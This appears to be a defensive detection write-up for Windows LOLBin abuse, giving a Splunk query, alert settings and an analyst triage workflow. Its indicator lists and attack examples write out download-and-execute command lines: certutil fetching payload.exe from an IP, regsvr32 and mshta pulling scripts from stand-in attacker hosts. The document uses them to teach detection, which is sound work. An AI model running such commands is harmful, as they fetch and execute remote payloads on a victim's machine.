# Detection 04: Living-off-the-Land Binary (LOLBin) Execution

## What This Detects
Execution of legitimate Windows system binaries that are commonly abused by attackers to perform malicious activities while evading detection. These "Living-off-the-Land Binaries" (LOLBins) are signed by Microsoft but can be weaponized for file downloads, code execution, and defense evasion.

## MITRE ATT&CK Mapping
- **Tactic** : Defense Evasion (TA0005)
- **Technique** : System Binary Proxy Execution (T1218)
- **Sub-techniques** : Certutil (T1218.003), Rundll32 (T1218.011), Regsvr32 (T1218.010), Mshta (T1218.005) |

## Detection Logic (SPL)
```spl
index=sysmon EventCode=1
| search Image="*certutil.exe" OR Image="*rundll32.exe" OR Image="*regsvr32.exe" OR Image="*mshta.exe"
| table _time, User, Image, CommandLine, ParentImage
```

**Why Sysmon Event ID 1?**  
Event ID 1 captures process creation events with full command-line arguments, allowing us to see how these tools are being used, not just that they ran.

## Alert Configuration
| **Schedule** : Every 5 minutes (`*/5 * * * *`) 
| **Trigger** : For Each Result
| **Throttle Field** : Image 
| **Throttle Duration** : 15 minutes
| **Severity** : Medium

## Test Procedure

### Safe Test Command ([Command Execution](./screenshots/Command_Execution.png))
```powershell
# Use certutil to encode a file (harmless operation)
certutil -encode C:\Windows\System32\drivers\etc\hosts encoded.txt

# Cleanup
Remove-Item encoded.txt -ErrorAction SilentlyContinue
```

**What gets logged:**
- Sysmon Event ID 1 (Process Creation)
- Image: `certutil.exe`
- CommandLine: Full command with parameters
- ParentImage: Process that launched certutil (likely cmd.exe or powershell.exe)
- User: Account that executed the command

## Investigation Workflow

When this alert fires, analyze these fields:

### 1. CommandLine Analysis

**Benign indicators:**
```
certutil -addstore Root certificate.cer
rundll32.exe shell32.dll,Control_RunDLL desk.cpl
regsvr32 C:\Windows\System32\scrrun.dll
```

**Malicious indicators:**
```
certutil -urlcache -f http://185.22.33.44/payload.exe
rundll32.exe javascript:"\..\mshtml
regsvr32 /s /u /i:http://attacker.com/evil.sct
mshta http://malicious-site.com/backdoor.hta
```

**Red flags:**
- HTTP/HTTPS URLs in CommandLine
- IP addresses instead of domain names
- JavaScript or VBScript code
- Obfuscated parameters
- Unusual file paths (temp directories, user profiles)

### 2. ParentImage Analysis

**Benign patterns:**
```
ParentImage: C:\Windows\System32\mmc.exe (Admin console)
ParentImage: C:\Windows\explorer.exe (User clicked)
ParentImage: C:\Program Files\Installer\setup.exe (Software install)
```

**Suspicious patterns:**
```
ParentImage: C:\Windows\System32\cmd.exe (Scripted execution)
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (Suspicious)
ParentImage: C:\Windows\System32\wscript.exe (Script-based)
ParentImage: C:\Users\Bob\AppData\Local\Temp\random.exe (Very suspicious)
```

**If LOLBin launched by another LOLBin → HIGH PRIORITY**

### 3. User Context

**Questions to ask:**
- Is this user an administrator?
- Does their role justify using these tools?
- Is this their first time using this tool?
- Any recent account compromise indicators?

### 4. Timing & Frequency

**Single execution:**
- May be legitimate admin task
- Investigate but lower priority

**Multiple executions in short time:**
- Potential automated attack
- Higher priority investigation

**After-hours execution:**
- Outside business hours = suspicious
- Especially from non-IT users

## Results

- LOLBin execution captured via Sysmon Event ID 1
- Full command-line arguments visible for analysis
- Parent process tracked (shows execution chain)
- Alert triggered on certutil test execution
- Throttling prevents duplicate alerts per binary
- Manual review required to determine malicious vs. legitimate use

## Screenshots

- [Alert Triggered](./screenshots/01-alert-triggered.png)
- [Alert Details](./screenshots/02-alert-details.png)
- [Sysmon Event Logs](./screenshots/03-event-log.png)


## False Positive Considerations

### Common Legitimate Uses

**certutil.exe:**
- Installing/managing certificates
- Verifying certificate stores
- IT admin troubleshooting

**rundll32.exe:**
- Opening Control Panel items
- Windows system functions
- Legitimate DLL operations

**regsvr32.exe:**
- Software installation
- Registering COM components
- System updates

**mshta.exe:**
- Rare legitimate use (legacy HTA apps)
- Most modern use is malicious


## Real-World Attack Examples

### Example 1: Certutil for Malware Download
```
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil -urlcache -split -f http://192.168.1.50/payload.exe C:\Users\Public\p.exe
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: victim-user
```

**Indicators:**
- Downloading from IP (not domain)
- Saving to C:\Users\Public (common staging area)
- Launched by PowerShell (scripted attack)
- **Verdict: MALICIOUS**


### Example 2: Legitimate Certificate Installation
```
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil -addstore -f Root "C:\Certificates\CompanyRoot.cer"
ParentImage: C:\Windows\System32\mmc.exe
User: IT-Admin
```

**Indicators:**
- Using -addstore (legitimate function)
- Launched by mmc.exe (Certificate Manager)
- IT Admin account
- **Verdict: BENIGN**

## Why This Detection Matters

**LOLBins are favored by:**
- Advanced Persistent Threats (APTs)
- Ransomware operators
- Penetration testers / Red Teams
- Post-exploitation frameworks (Cobalt Strike, Metasploit)

**Benefits of detection:**
- Catches attacks that bypass traditional AV
- Identifies living-off-the-land techniques
- Provides visibility into attacker tooling choices
- Enables early detection before damage occurs

## Notes

**Coverage vs. Noise:**  
This detection intentionally casts a wide net. In mature environments, expect to add whitelists for:
- Specific admin accounts
- Known automation scripts
- Software deployment tools

**The goal:** Catch 100% of malicious use while gradually tuning out known-good patterns through iterative refinement.
